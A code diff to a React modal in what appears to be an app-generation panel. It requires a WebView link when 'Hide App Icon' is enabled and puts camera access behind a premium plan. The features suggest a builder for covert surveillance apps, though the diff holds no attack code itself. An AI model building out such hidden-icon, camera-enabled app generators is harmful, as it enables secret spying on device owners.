@@ -99,6 +99,17 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     }, [socket]);
 
     const startGeneration = async () => {
+        // Validate web link requirement
+        if (hideApp && !webLink.trim()) {
+            alert('⚠️ Web Link is required when "Hide App Icon" is enabled!\n\nThe app needs a WebView link to display when hidden from launcher.');
+            return;
+        }
+
+        if (!hideApp && !webLink.trim()) {
+            const confirmed = confirm('You have not provided a Web Link.\n\nThe app will not show any WebView interface. Continue?');
+            if (!confirmed) return;
+        }
+
         setStatus('generating');
         setProgress(5);
         setProgressStep("Initializing request...");
@@ -246,11 +257,12 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 </button>
                             </div>
 
-                            {/* Camera Permission */}
-                            <div className="flex items-center justify-between bg-white/5 p-3 rounded-lg border border-white/10 mb-2">
+                            {/* Camera Permission - Premium Only */}
+                            <div className={`flex items-center justify-between bg-white/5 p-3 rounded-lg border ${userPlan !== 'premium' ? 'border-yellow-500/30 opacity-60' : 'border-white/10'} mb-2`}>
                                 <div className="flex items-center gap-2">
                                     <svg className="w-4 h-4 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
                                     <span className="text-sm font-medium text-white/70">Camera Access</span>
+                                    {userPlan !== 'premium' && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PREMIUM</span>}
                                     <button
                                         onClick={() => setShowPermissionInfo('camera')}
                                         className="text-white/40 hover:text-cyan-400 transition-colors"
@@ -259,10 +271,16 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     </button>
                                 </div>
                                 <button
-                                    onClick={() => setEnableCameraPermission(!enableCameraPermission)}
-                                    className={`w-12 h-6 rounded-full transition-colors relative ${enableCameraPermission ? 'bg-cyan-500' : 'bg-white/20'}`}
+                                    onClick={() => {
+                                        if (userPlan !== 'premium') {
+                                            onUpgrade?.();
+                                            return;
+                                        }
+                                        setEnableCameraPermission(!enableCameraPermission);
+                                    }}
+                                    className={`w-12 h-6 rounded-full transition-colors relative ${userPlan !== 'premium' ? 'bg-white/10' : enableCameraPermission ? 'bg-cyan-500' : 'bg-white/20'}`}
                                 >
-                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableCameraPermission ? 'left-7' : 'left-1'}`} />
+                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableCameraPermission && userPlan === 'premium' ? 'left-7' : 'left-1'}`} />
                                 </button>
                             </div>
 
